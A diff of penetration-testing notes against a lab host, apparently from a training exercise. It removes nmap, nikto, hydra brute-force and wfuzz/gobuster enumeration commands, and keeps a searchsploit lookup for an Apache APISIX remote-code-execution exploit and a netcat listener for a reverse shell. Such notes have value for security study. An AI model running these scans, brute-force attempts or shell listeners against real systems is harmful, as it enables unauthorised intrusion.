@@ -15,33 +15,9 @@ export IP=192.168.232.220
 
 Service Info: OS: Linux
 
-
-3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000   <!-- nothing -->
-
-nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
-nikto --url $IP -p 43500
-nikto --url $IP 
-
-Port 3306
-hydra -l root -P /usr/share/wordlists/rockyou.txt $IP mysql -s 3306 -e nsr       // [ERROR] Host '192.168.45.5' is not allowed to connect to this MySQL server 
-
-Port 80 Enumeration
-Files  <!-- nothing -->
-wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
-wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
-wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
-gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/big.txt  -o gobuster.txt -t 50 -x zip,php,txt 
-
-Directories <!-- nothing -->
-wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 -t 30 "http://$IP/FUZZ/"
-wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ/"
-wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$IP/FUZZ/"
-
 Port 43500 Enumeration  <!-- nothing -->
 
-Check the page source and server headers
-
-Discovered APISIX 2.8 header on port 43500
+Check the page source and server headers, Discovered APISIX 2.8 header on port 43500
 
 searchsploit APISIX          // Apache APISIX 2.12.1 - Remote Code Execution (RCE)
 nc -lnvp 4444
